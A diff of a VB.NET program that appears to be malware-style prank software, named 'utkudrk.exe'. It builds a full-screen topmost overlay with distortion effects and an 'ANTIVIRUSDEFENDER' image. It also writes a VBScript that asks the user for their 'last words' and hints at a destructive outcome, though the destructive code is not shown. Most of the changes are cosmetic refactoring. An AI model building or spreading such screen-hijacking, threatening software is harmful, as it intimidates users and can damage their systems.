@@ -94,18 +94,18 @@ Public Class Form1
 
         ' Initialize the full-screen overlay form
         Public Sub New()
-            Me.FormBorderStyle = FormBorderStyle.None
-            Me.Bounds = Screen.PrimaryScreen.Bounds ' Set form to full-screen
-            Me.TopMost = True
-            Me.BackColor = Color.Black
-            Me.Opacity = 0.7 ' Transparency setting
+            FormBorderStyle = FormBorderStyle.None
+            Bounds = Screen.PrimaryScreen.Bounds ' Set form to full-screen
+            TopMost = True
+            BackColor = Color.Black
+            Opacity = 0.7 ' Transparency setting
 
             ' Initialize and display the timer label
             timerLabel.AutoSize = True
             timerLabel.ForeColor = Color.White
             timerLabel.Font = New Font("Segoe UI", 20, FontStyle.Bold)
             timerLabel.Location = New Point(10, 10) ' Position of the timer on the screen
-            Me.Controls.Add(timerLabel)
+            Controls.Add(timerLabel)
 
             ' Initialize and start audio
             audioPlayer.PlayAudio()
@@ -288,7 +288,7 @@ Public Class Form1
         ' Timer tick function, applies effects and updates countdown timer
         Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs)
             Try
-                Dim g As Graphics = Me.CreateGraphics()
+                Dim g As Graphics = CreateGraphics()
                 g.SmoothingMode = SmoothingMode.None
 
                 ' Draw portal effect first
@@ -373,8 +373,8 @@ Public Class Form1
             Dim gridSize As Integer = 20 ' Size of each pixelated "block"
             portalEffectPhase += 0.05F ' Increment phase for wavy distortion
 
-            For y As Integer = 0 To Me.Height Step gridSize
-                For x As Integer = 0 To Me.Width Step gridSize
+            For y As Integer = 0 To Height Step gridSize
+                For x As Integer = 0 To Width Step gridSize
                     ' Calculate distorted positions using sine wave (for swirling effect)
                     Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
                     Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)
@@ -1053,7 +1053,7 @@ Public Class Form1
 
     Private Sub CreateEpicVBScriptFile()
         ' Create the VBScript content
-        Dim vbsContent As String = "MsgBox ""What Are Your Last Words? Spoiler: There two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see from starting at Windows"" , 0, ""utkudrk.exe""" & vbCrLf &
+        Dim vbsContent As String = "MsgBox ""What Are Your Famous Last Words? Spoiler: There two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see from starting at Windows"" , 0, ""utkudrk.exe""" & vbCrLf &
         "Dim userInput" & vbCrLf &
         "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
         "If userInput = ""FUCK YOU"" Then" & vbCrLf &
@@ -1179,8 +1179,8 @@ Public Class Form1
         portalImage.Save(filePath, System.Drawing.Imaging.ImageFormat.Png)
 
         ' Draw the image with the portal effect
-        For y As Integer = 0 To Me.Height Step gridSize
-            For x As Integer = 0 To Me.Width Step gridSize
+        For y As Integer = 0 To Height Step gridSize
+            For x As Integer = 0 To Width Step gridSize
                 ' Calculate distorted positions using sine wave (for swirling effect)
                 Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
                 Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)
@@ -1212,8 +1212,12 @@ Public Class Form1
     End Sub
 
     Private Sub PortalTimer_Tick(sender As Object, e As EventArgs) Handles portalTimer.Tick
-        ' Invalidate the form to trigger a repaint
-        Invalidate()
+        ' Clear the screen by drawing a blank background
+        Using g As Graphics = CreateGraphics()
+            ' Fill the form with a solid color to clear any existing drawings
+            g.Clear(BackColor)
+            ApplyPortalEffect(g)
+        End Using
     End Sub
 
     Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
@@ -1235,18 +1239,18 @@ Public Class Form1
     ' Timer Tick event handler for animation effects
     Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs) Handles animationTimer.Tick
         ' Create a blur effect by drawing semi-transparent rectangles
-        Dim g As Graphics = Me.CreateGraphics()
+        Dim g As Graphics = CreateGraphics()
         Dim blurBrush As New SolidBrush(Color.FromArgb(50, Color.Black))
 
         For i As Integer = 0 To 10
             Dim offset As Integer = i * 5
-            g.FillRectangle(blurBrush, 0 - offset, 0 - offset, Me.Width + offset * 2, Me.Height + offset * 2)
+            g.FillRectangle(blurBrush, 0 - offset, 0 - offset, Width + offset * 2, Height + offset * 2)
         Next
 
         ' Draw the ANTIVIRUSDEFENDER image
         If antivirusdefenderImage IsNot Nothing Then
-            Dim x As Integer = Me.ClientSize.Width \ 2 - antivirusdefenderImage.Width \ 2
-            Dim y As Integer = Me.ClientSize.Height \ 2 - antivirusdefenderImage.Height \ 2
+            Dim x As Integer = ClientSize.Width \ 2 - antivirusdefenderImage.Width \ 2
+            Dim y As Integer = ClientSize.Height \ 2 - antivirusdefenderImage.Height \ 2
             g.DrawImage(antivirusdefenderImage, x, y)
         End If
 
